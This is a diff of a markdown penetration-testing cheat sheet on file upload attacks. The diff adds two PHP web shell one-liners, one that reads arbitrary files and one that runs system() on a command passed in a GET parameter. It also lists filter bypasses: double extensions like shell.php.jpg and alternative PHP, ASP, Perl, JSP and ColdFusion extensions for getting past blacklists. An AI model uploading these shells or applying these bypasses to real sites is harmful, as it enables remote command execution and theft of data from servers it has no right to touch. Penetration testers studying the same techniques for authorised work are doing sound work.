@@ -1,7 +1,11 @@
 ## General
 
 Upload shell to make reverse shell
+```
+<?php echo file_get_contents('/path/to/target/file'); ?>
 
+<?php echo system($_GET['command']); ?>
+```
 # Bypass file upload filtering
 
 ### Client Side
@@ -10,12 +14,12 @@ Upload shell to make reverse shell
 ### Rename it
 - upload it as shell.php.jpg
 ### Blacklisting bypass, change extension
-- `php phtml, .php, .php3, .php4, .php5, and .inc`
+- php: `phtml, .php, .php3, .php4, .php5, and .inc`
 - bypassed by uploading an unpopular php extensions. such as: `pht, phpt, phtml, php3, php4, php5, php6`
-- asp `asp, .aspx`
-- perl `.pl, .pm, .cgi, .lib`
-- jsp `.jsp, .jspx, .jsw, .jsv, and .jspf`
-- Coldfusion `.cfm, .cfml, .cfc, .dbm`
+- asp: `asp, .aspx`
+- perl: `.pl, .pm, .cgi, .lib`
+- jsp: `.jsp, .jspx, .jsw, .jsv, and .jspf`
+- Coldfusion: `.cfm, .cfml, .cfc, .dbm`
 ### Whitelisting bypass
 
 - Bypassed by uploading a file with some type of tricks,
